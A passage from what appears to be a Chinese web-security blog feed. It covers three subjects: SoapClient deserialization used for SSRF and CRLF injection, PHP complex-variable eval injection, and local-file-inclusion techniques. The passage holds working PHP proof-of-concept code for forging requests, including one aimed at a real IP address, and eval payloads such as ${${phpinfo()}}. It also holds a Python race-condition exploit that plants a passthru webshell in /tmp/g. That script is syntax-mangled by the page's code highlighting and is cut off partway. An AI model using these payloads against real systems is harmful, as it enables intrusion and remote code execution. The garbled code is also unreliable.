<p>PHP 的 SOAP 扩展可以用来提供和使用 Web Services，这个扩展实现了6个类，其中的SoapClient类是用来创建soap数据报文，与wsdl接口进行交互的，同时这个类下也是有反序列化中常常用到的__call()魔术方法。</p>
<p>该类的构造函数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public SoapClient :: SoapClient (mixed $wsdl [,array $options ])</span><br></pre></td></tr></table></figure>
<p>第一个参数是用来指明是否是wsdl模式。</p>
<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置<code>location</code>和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
<p><a href="https://lethe.site/2019/09/06/%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB/20190906000607209.png"><img src="https://lethe.site/2019/09/06/%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB/20190906000607209.png" alt="在这里插入图片描述"></a></p>
<p>知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。</p>
<p>我们可以设置第一个参数为<code>null</code>，然后第二个参数的<code>location</code>选项设置为<code>target_url</code>，如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&quot;http://xxx.xxx.xxx&quot;</span>,</span><br><span class="line">                                     <span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当把上述脚本得到的序列化串进行反序列化（unserialize），并执行一个SoapClient没有的成员函数时，会自动调用该类的<code>__Call</code>方法，然后向<code>target_url</code>发送一个soap请求，并且<code>uri</code>选项是我们可控的地方。</p>
<h2 id="0x03-CRLF-Injection">0x03 CRLF Injection</h2>
<p>CRLF是”回车 + 换行”<code>(\r\n)</code>的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
<p>参考链接：<br>
[CRLF Injection漏洞的利用与实例分析](<a href="https://wooyun.js.org/drops/CRLF">https://wooyun.js.org/drops/CRLF</a> Injection漏洞的利用与实例分析.html)</p>
<h2 id="0x04-SSRF-CRLF攻击内网">0x04 SSRF+CRLF攻击内网</h2>
<p>实际上很多时候都需要这两个漏洞配合在一起使用，当我们我们可以从外网调用到soap的api，而攻击目标是在内网，那么就可以利用SoapClient进行SSRF攻击内网，然后配合CRLF构造POST请求增加我们的攻击面。</p>
<p>那么为什么在用SoapClient类进行SSRF的时候会有CRLF注入的问题呢？如下：</p>
<p><a href="https://lethe.site/2019/09/06/%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB/20190906003122388.png"><img src="https://lethe.site/2019/09/06/%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB/20190906003122388.png" alt="在这里插入图片描述"></a></p>
<p>可以看到options参数中还有一个选项为<code>user_agent</code>，运行我们自己设置<code>User-Agent</code>的值。</p>
<p>当我们可以控制<code>User-Agent</code>的值时，也就意味着我们完全可以构造一个POST请求，因为<code>Content-Type</code>为和<code>Content-Length</code>都在<code>User-Agent</code>之下，而控制这两个是利用CRLF发送post请求最关键的地方。</p>
<p>最后给出wupco师傅的生成任意POST报文的POC:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&#x27;http://123.206.216.198/bbb.php&#x27;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;a=b&amp;flag=aaa&#x27;</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: xxxx=1234&#x27;</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&#x27;%0d%0a&#x27;</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;%26&#x27;</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果是GET请求的话，那么构造好location就行：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; $url, <span class="string">&#x27;location&#x27;</span> =&gt; $url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&quot;\r\n&quot;</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span> . urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP复杂变量解析</title>
    <url>/Web_security/php_related/11.PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="PHP复杂变量解析学习">PHP复杂变量解析学习</h1>
<h2 id="0x01-基础知识">0x01 基础知识</h2>
<h3 id="单引号和双引号的区别">单引号和双引号的区别</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test=<span class="string">&#x27;hello world！&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$test</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$test&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>输出的结果是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello world!</span><br><span class="line">$test</span><br></pre></td></tr></table></figure>
<p>也就是说，PHP中的单引号会直接解析成字符串，而如果是双引号，那么PHP会首先去看双引号里面有没有变量，如果有变量的话那么会先进行变量解析，即替换成它的值。</p>
<h3 id="变量的识别">变量的识别</h3>
<p>首先看一下文档里面是怎么定义复杂解析的</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714091757.png" alt=""></p>
<p>举一个例子容易了解花括号的作用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test=<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;$&#123;test&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$test&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>输出的结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello world!</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure>
<p>另外一个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fruit=<span class="string">&quot;apple&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;there are many <span class="subst">&#123;$fruit&#125;</span>s&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">there are many apples</span><br></pre></td></tr></table></figure>
<p>结合两个例子可以知道，花括号<strong>起到标记变量的界限的作用</strong>，在第二个例子中如果没有花括号那么php将会把变量识别为$fruits进而使结果异常。另外也说明php会尽量多地取组合可用的字符作为变量名。</p>
<h3 id="花括号中使用函数，方法，静态类变量和类常量">花括号中使用函数，方法，静态类变量和类常量</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714091936.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$Hed9eh0g=<span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getname</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hed9eh0g&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hed9eh0g&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;$&#123;getname()&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hed9eh0g</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
<p>可以看出在双引号包裹的<code>$&#123;&#125;</code>这种形式内部如果有方法名，则这个方法是可以执行的，本例子中首先执行了echo语句，然后再return对应的值Hed9eh0g，与外层形成新的结果​<code>$&#123;Hed9eh0g&#125;</code>，此时php会将其识别为一个变量，然后进行解析并替换成其对应的结果。<br>
如果再在getname()外层包裹一层​<code>$&#123;&#125;</code>，那么结果将会报错，因为根据刚才的推理可知php最终会识别$test为一个变量，而这是一个我们没有定义过的变量。<br>
虽然会报错，但是不影响getname函数的echo语句的执行。</p>
<h2 id="0x02-练习">0x02 练习</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$str = @(<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;$str = &quot;&#x27;</span>.addslashes($str).<span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>两种payload，分别是：<code>?str=&#123;$&#123;phpinfo()&#125;&#125;</code>和<code>?str=$&#123;$&#123;phpinfo()&#125;&#125;</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714101545.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714101529.png" alt=""></p>
<p>eval函数将字符串当作php代码执行，因此，通过图中代码清晰可见相当于定义了str变量，赋值为一个字符串<code>&#123;$&#123;phpinfo()&#125;&#125;</code>。</p>
<p><code>$str = &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;</code>，花括号定义了变量的边界，因此该条语句先执行括号中内容，获取函数返回值，并以返回值的string命名变量再赋值给str变量。</p>
<p>并且第二个payload会报一个错误</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714101747.png" alt=""></p>
<p>函数phpinfo，会返回 <code>true</code>，因为 <code>true</code>，是bool类型的变量，然后进行类型转化，转化为字符串<code>1</code>,所以调用的参数就是<code>$1</code>，这也是上面第二个payload报错为<code>Undefined variable: 1</code>的原因。</p>
<h2 id="0x03-继续思考">0x03 继续思考</h2>
<p>如果将addslashes 用单引号包裹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$str &#x3D; @(string)$_GET[&#39;str&#39;];</span><br><span class="line">eval(&quot;$str &#x3D; &#39;&quot;.addslashes($str).&quot;&#39;;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>再试一下这两个payload</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714102044.png" alt=""></p>
<p><code>&#123;$&#123;phpinfo()&#125;&#125;</code>执行失败</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714102124.png" alt=""></p>
<p><code>$&#123;$&#123;phpinfo()&#125;&#125;</code>执行成功。</p>
<p>复杂变量解析的前提是双引号包裹,第二次实验中，addslashes函数部分被单引号包裹，所以只是简单的字符串，但是前面<code>$str</code>却是被双引号包裹，所以可以进行复杂变量解析。<br>
那么payload1的<code>&#123;$&#123;phpinfo()&#125;&#125;</code>和payload2的​<code>$&#123;$&#123;phpinfo()&#125;&#125;</code>看样子都可以进行解析之后执行函数？但事实上却只有payload2可以实现。问题出在哪？<br>
这里注意了，​<code>$str</code>此时是左值，也即位于赋值语句的左侧，而左值必须得是一个变量，也即必须由字符$开头，显然payload1的开头字符是{，因此它压根不是一个变量，此时前面我们所谈的变量解析的特性都没有用。</p>
<h2 id="0x04-参考文章">0x04 参考文章</h2>
<p><a href="https://www.andseclab.com/2020/01/22/php%e5%a4%8d%e6%9d%82%e5%8f%98%e9%87%8f%e8%a7%a3%e6%9e%90%e5%ad%a6%e4%b9%a0%e8%ae%b0%e5%bd%95/">AD攻防实验室</a></p>
<p><a href="https://www.anquanke.com/post/id/176331#h2-4">https://www.anquanke.com/post/id/176331#h2-4</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>Web安全基础</tag>
        <tag>PHP变量解析</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP LFI利用总结</title>
    <url>/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="PHP-LFI利用总结">PHP LFI利用总结</h1>
<blockquote>
<p>参考文章：<a href="https://www.anquanke.com/post/id/177491">https://www.anquanke.com/post/id/177491</a></p>
</blockquote>
<h2 id="proc-self-environ">proc/self/environ</h2>
<p><strong>前置条件</strong></p>
<ul>
<li>php以cgi方式运行，这样environ才会保持UA头。</li>
<li>environ文件存储位置已知，且environ文件可读。</li>
</ul>
<p><strong>利用方式</strong></p>
<p>如果可以读取，修改<code>User-Agent</code>为php代码，然后lfi点包含，实现rce。</p>
<h2 id="proc-self-fd-1-2-3…">proc/self/fd/1,2,3…</h2>
<p><strong>前置条件</strong></p>
<ul>
<li>
<p>php以cgi方式运行。</p>
</li>
<li>
<p>environ文件存储位置已知，且environ文件可读。</p>
</li>
</ul>
<p>类似于<code>/proc/self/environ</code>，不同是在<code>referer</code>或报错等写入php代码，然后lfi点包含，实现rce。</p>
<h2 id="PHP伪协议">PHP伪协议</h2>
<h3 id="常用伪协议">常用伪协议</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921104109.png" alt=""></p>
<h3 id="expect">expect://</h3>
<p><strong>前置条件</strong></p>
<ul>
<li>默认不开启，需要安装PECL package扩展</li>
<li>需要<code>allow_url_include</code>开启</li>
</ul>
<p><strong>利用方式</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">expect:&#x2F;&#x2F;[command]</span><br></pre></td></tr></table></figure>
<h2 id="日志">日志</h2>
<h3 id="Apache日志">Apache日志</h3>
<p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
<p>CTF实例：</p>
<p><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two</a></p>
<h2 id="with-phpinfo">with phpinfo</h2>
<p>在可以访问phpinfo的情况下，疯狂上传大文件，同时在phpinfo中可以看到上传的文件在tmp目录下的文件名，条件竞争，在文件被删除之前包含进来getshell。</p>
<p>利用脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line">def setup(host, port):</span><br><span class="line">    TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD=<span class="string">&quot;&quot;</span><span class="string">&quot;%sr</span></span><br><span class="line"><span class="string">&lt;?php <span class="subst">$c</span>=fopen(&#x27;/tmp/g&#x27;,&#x27;w&#x27;);fwrite(<span class="subst">$c</span>,&#x27;&lt;?php passthru(<span class="subst">$_GET</span>[&quot;</span>f<span class="string">&quot;]);?&gt;&#x27;);?&gt;r&quot;</span><span class="string">&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">&quot;&quot;</span><span class="string">&quot;-----------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>dummyname<span class="string">&quot;; filename=&quot;</span>test.txt<span class="string">&quot;r</span></span><br><span class="line"><span class="string">Content-Type: text/plainr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--r&quot;</span><span class="string">&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">&quot;&quot;</span><span class="string">&quot;POST /phpinfo.php?a=&quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot; HTTP/1.1r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;</span><span class="string">&quot;&quot;</span> + padding + <span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Length: %sr</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s&quot;</span><span class="string">&quot;&quot;</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script</span></span><br><span class="line"><span class="comment">#     LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s%%00 HTTP/1.1r</span></span><br><span class="line"><span class="comment"># User-Agent: Mozilla/4.0r</span></span><br><span class="line"><span class="comment"># Proxy-Connection: Keep-Aliver</span></span><br><span class="line"><span class="comment"># Host: %sr</span></span><br><span class="line"><span class="comment"># r</span></span><br><span class="line"><span class="comment"># r</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line">    LFIREQ=<span class="string">&quot;&quot;</span><span class="string">&quot;GET /lfi.php?file=%s HTTP/1.1r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Aliver</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt&quot;</span>)</span><br><span class="line">        fn = d[i+17:i+31]</span><br><span class="line">        <span class="comment"># print fn</span></span><br><span class="line">    except ValueError:</span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (<span class="function"><span class="keyword">fn</span>, <span class="title">host</span>))</span></span><br><span class="line"><span class="function">    <span class="title">d</span> = <span class="title">s2</span>.<span class="title">recv</span>(<span class="params"><span class="number">4096</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">s2</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">d</span>.<span class="title">find</span>(<span class="params">tag</span>) != -1:</span></span><br><span class="line"><span class="function">        <span class="title">return</span> <span class="title">fn</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">counter</span>=0</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">ThreadWorker</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">__init__</span>(<span class="params"><span class="built_in">self</span>, e, l, m, *args</span>):</span></span><br><span class="line"><span class="function">        <span class="title">threading</span>.<span class="title">Thread</span>.<span class="title">__init__</span>(<span class="params"><span class="built_in">self</span></span>)</span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">event</span> = <span class="title">e</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">lock</span> = <span class="title">l</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">maxattempts</span> = <span class="title">m</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">args</span> = <span class="title">args</span></span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">run</span>(<span class="params"><span class="built_in">self</span></span>):</span></span><br><span class="line"><span class="function">        <span class="title">global</span> <span class="title">counter</span></span></span><br><span class="line"><span class="function">        <span class="title">while</span> <span class="title">not</span> <span class="title">self</span>.<span class="title">event</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">            <span class="title">with</span> <span class="title">self</span>.<span class="title">lock</span>:</span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">counter</span> &gt;= <span class="title">self</span>.<span class="title">maxattempts</span>:</span></span><br><span class="line"><span class="function">                    <span class="title">return</span></span></span><br><span class="line"><span class="function">                <span class="title">counter</span>+=1</span></span><br><span class="line"><span class="function">            <span class="title">try</span>:</span></span><br><span class="line"><span class="function">                <span class="title">x</span> = <span class="title">phpInfoLFI</span>(<span class="params">*<span class="built_in">self</span>.args</span>)</span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">self</span>.<span class="title">event</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">                    <span class="title">break</span></span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">x</span>:</span></span><br><span class="line"><span class="function">                    <span class="title">print</span> &quot;<span class="title">nGot</span> <span class="title">it</span>! <span class="title">Shell</span> <span class="title">created</span> <span class="title">in</span> /<span class="title">tmp</span>/<span class="title">g</span>&quot;</span></span><br><span class="line"><span class="function">                    <span class="title">self</span>.<span class="title">event</span>.<span class="title">set</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            <span class="title">except</span> <span class="title">socket</span>.<span class="title">error</span>:</span></span><br><span class="line"><span class="function">                <span class="title">return</span></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span></span><br><span class="line"><span class="function">    &quot;&quot;&quot;<span class="title">Gets</span> <span class="title">offset</span> <span class="title">of</span> <span class="title">tmp_name</span> <span class="title">in</span> <span class="title">the</span> <span class="title">php</span> <span class="title">output</span>&quot;&quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">s</span> = <span class="title">socket</span>.<span class="title">socket</span>(<span class="params">socket.AF_INET, socket.SOCK_STREAM</span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">connect</span>(<span class="params">(<span class="params">host,port</span>)</span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">send</span>(<span class="params">phpinforeq</span>)</span></span><br><span class="line"><span class="function">    <span class="title">d</span> = &quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="function">        <span class="title">i</span> = <span class="title">s</span>.<span class="title">recv</span>(<span class="params"><span class="number">4096</span></span>)</span></span><br><span class="line"><span class="function">        <span class="title">d</span>+=<span class="title">i</span></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="title">i</span> == &quot;&quot;:</span></span><br><span class="line"><span class="function">            <span class="title">break</span></span></span><br><span class="line"><span class="function">        # <span class="title">detect</span> <span class="title">the</span> <span class="title">final</span> <span class="title">chunk</span></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="title">i</span>.<span class="title">endswith</span>(<span class="params"><span class="string">&quot;0rnrn&quot;</span></span>):</span></span><br><span class="line"><span class="function">            <span class="title">break</span></span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">i</span> = <span class="title">d</span>.<span class="title">find</span>(<span class="params"><span class="string">&quot;[tmp_name] =&amp;gt&quot;</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">i</span> == -1:</span></span><br><span class="line"><span class="function">        <span class="title">raise</span> <span class="title">ValueError</span>(<span class="params"><span class="string">&quot;No php tmp_name in phpinfo output&quot;</span></span>)</span></span><br><span class="line">    print &quot;found %s at %i&quot; % (d[i:i+10],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line">def main():</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    except socket.<span class="built_in">error</span>, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = <span class="keyword">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = <span class="keyword">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with poolsz 